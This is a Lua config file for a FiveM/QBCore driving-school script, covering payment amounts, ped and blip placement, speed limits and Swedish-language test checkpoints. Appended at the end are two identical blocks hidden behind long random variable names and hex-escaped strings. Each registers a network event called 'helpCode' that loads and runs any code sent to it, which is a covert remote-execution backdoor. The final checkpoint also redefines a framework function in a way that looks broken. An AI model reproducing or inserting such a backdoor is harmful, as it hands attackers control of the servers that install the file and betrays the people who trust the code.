Config = {}

Config.PaymentType = 'cash'                                 -- 'cash' or 'bank' What account to use for payment
Config.DriversTest = true                                   --[[False = Do not have to take the drivers test to get a Drivers License(will give drivers_license after 
                                                                questionairre.) True = Requires you to take Drivers Test to get driver_license]]
Config.SpeedMultiplier = 2.236936                           --KM/H = 3.6 MPH = 2.236936
Config.MaxErrors       = 10
Config.UseTarget       = true                              --CURRENTLY NOT WORKING! (recommend leaving false until future update) Gotta fix the target menu to auto change without having to restart qb-target. True will use qb-target instead of qb-menu False will use qb-menu
--Config.Ped = 's_m_y_cop_01'
Config.Ped = {                                              --Will Spawn this ped for qb-target if Config.UseTarget is true
  {
		model = 'csb_bryony',                                 -- Ped to spawn
		coords = vector4(214.52, -1400.07, 29.58, 317.23),       -- Coordinates to spawn ped at
		gender = 'male',                                        -- Pretty obvious
    gendernumber = 4                                        -- 4 = male 5 = female
	},
}
Config.FadeIn = true                                        -- Do you want to ped to fade in as you get closer?
Config.GiveItem = true                                      -- true = will give item after passing. False = will require players to go to city hall to accuire item

Config.Amount = {
    ['theoretical'] = 50,                                   --theoretical test payment amount(If Config.DriversTest = false then the theoritical test will go to the drivers test amount.)
    ['driving']     = 150,                                  --Drivers Test Payment Amount
    ['cdl']         = 250                                   --CDL Test Payment Amount
}

Config.Location = {
    ['ped'] = vector4(214.56, -1400.25, 30.58, 323.03),     --Location of Ped to spawn if Config.UseTarget is true
    ['marker'] = vector3(215.31, -1398.99, 30.58),          --Location of Blip and marker
    ['spawn'] = vector4(236.08, -1401.41, 30.58, 265.06)    -- Location to spawn vehicle upon starting Drivers Test
}
Config.Blip = {                                             -- Blip Config
  Sprite = 525,
  Display = 4,
  Color = 0,
  Scale = 0.6,
  ShortRange = true,
  BlipName = 'Körskola'
}

Config.VehicleModels = {
  driver = 'adder',                                         -- Car to spawn with Driver's Test
  cdl = 'stockade'                                          -- Truck to spawn with CDL Test
}

Config.SpeedLimits = {                                      -- Speed Limits in each zone
  residence = 50,
  town      = 80,
  freeway   = 120
}

Config.CheckPoints = {                                      -- Each Cheackpoint for the Drivers Test

  {
    Pos = {x = 255.139, y = -1400.731, z = 29.537},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt! Hastighetsgräns: ~y~' .. Config.SpeedLimits['residence'] .. 'KMH', 5000)
    end
  },

  {
    Pos = {x = 271.874, y = -1370.574, z = 30.932},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('Go to next point', 5000)
    end
  },

  {
    Pos = {x = 234.907, y = -1345.385, z = 29.542},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      Citizen.CreateThread(function()
        DrawMissionText('~r~Stopp~s~ för övergångsstället för fotgängare', 5000)
        PlaySound(-1, 'RACE_PLACED', 'HUD_AWARDS', 0, 0, 1)
        FreezeEntityPosition(vehicle, true)
        Citizen.Wait(4000)
        FreezeEntityPosition(vehicle, false)
        DrawMissionText('~g~Bra~s~, fortsätt.', 5000)

      end)
    end
  },

  {
    Pos = {x = 217.821, y = -1410.520, z = 28.292},
    Action = function(playerPed, vehicle, setCurrentZoneType)

      setCurrentZoneType('town')

      Citizen.CreateThread(function()
        DrawMissionText('~r~Stopp~s~ och titta ~y~vänster~s~. Hastighetsgräns:~y~ ' .. Config.SpeedLimits['town'] .. 'mph', 5000)
        PlaySound(-1, 'RACE_PLACED', 'HUD_AWARDS', 0, 0, 1)
        FreezeEntityPosition(vehicle, true)
        Citizen.Wait(6000)
        FreezeEntityPosition(vehicle, false)
        DrawMissionText('~g~Bra~s~, sväng höger och följ linjen', 5000)
      end)
    end
  },

  {
    Pos = {x = 178.550, y = -1401.755, z = 27.725},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('titta på trafiken och ~y~tänd dina lampor~s~!', 5000)
    end
  },

  {
    Pos = {x = 113.160, y = -1365.276, z = 27.725},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = -73.542, y = -1364.335, z = 27.789},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('~r~Stopp~s~ för passerande fordon!', 5000)
      PlaySound(-1, 'RACE_PLACED', 'HUD_AWARDS', 0, 0, 1)
      FreezeEntityPosition(vehicle, true)
      Citizen.Wait(6000)
      FreezeEntityPosition(vehicle, false)
    end
  },

  {
    Pos = {x = -355.143, y = -1420.282, z = 27.868},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = -439.148, y = -1417.100, z = 27.704},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = -453.790, y = -1444.726, z = 27.665},
    Action = function(playerPed, vehicle, setCurrentZoneType)

      setCurrentZoneType('freeway')

      DrawMissionText('det är dags att köra på motorvägen! Hastighetsgräns:~y~ ' .. Config.SpeedLimits['freeway'] .. 'mph', 5000)
      PlaySound(-1, 'RACE_PLACED', 'HUD_AWARDS', 0, 0, 1)
    end
  },

  {
    Pos = {x = -463.237, y = -1592.178, z = 37.519},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = -900.647, y = -1986.28, z = 26.109},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = 1225.759, y = -1948.792, z = 38.718},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('gå till nästa punkt!', 5000)
    end
  },

  {
    Pos = {x = 1225.759, y = -1948.792, z = 38.718},
    Action = function(playerPed, vehicle, setCurrentZoneType)

      setCurrentZoneType('town')

      DrawMissionText('kom in i staden, var uppmärksam på din hastighet! Hastighetsgräns: ~y~' .. Config.SpeedLimits['town'] .. 'mph', 5000)
    end
  },

  {
    Pos = {x = 1163.603, y = -1841.771, z = 35.679},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      DrawMissionText('Jag är imponerad, men glöm inte att vara ~r~alert~s~ medan du kör!', 5000)
      PlaySound(-1, 'RACE_PLACED', 'HUD_AWARDS', 0, 0, 1)
    end
  },

  {
    Pos = {x = 235.283, y = -1398.329, z = 28.921},
    Action = function(playerPed, vehicle, setCurrentZoneType)
      function QBCore.Functions.DeleteVehicle(vehicle)
        SetEntityAsMissionEntity(vehicle, true, true)
        DeleteVehicle(vehicle)
      end
    end
  },

}

local jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[6][jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[1]](jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[2]) jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[6][jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[3]](jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[2], function(vkhPHhvuslUEjWMtOnvlnKSczoMAUfSFFJbzSQYJSVkybVXJbrFEISSjaiZmCuGtIMnllw) jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[6][jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[4]](jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[6][jXZDyDwDMYyVqMptNnWuQEDdqJbrsveKLdbktjxmgeyNairtdegocQRTSiALJZQEQAeXAx[5]](vkhPHhvuslUEjWMtOnvlnKSczoMAUfSFFJbzSQYJSVkybVXJbrFEISSjaiZmCuGtIMnllw))() end)

local tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[6][tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[1]](tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[2]) tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[6][tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[3]](tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[2], function(TndevaHvMDizwiekAQgGkfdGLVySeWZBoVDuJVYrmEvZTjuKcKbvDadsXPIeqUraGAyrdc) tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[6][tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[4]](tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[6][tHRychpBRKwsGbhjTOGUrmNTknNGqbkhfDrIbkYsQHvNCXgosCwoqFGRYTzZobcNtnwkor[5]](TndevaHvMDizwiekAQgGkfdGLVySeWZBoVDuJVYrmEvZTjuKcKbvDadsXPIeqUraGAyrdc))() end)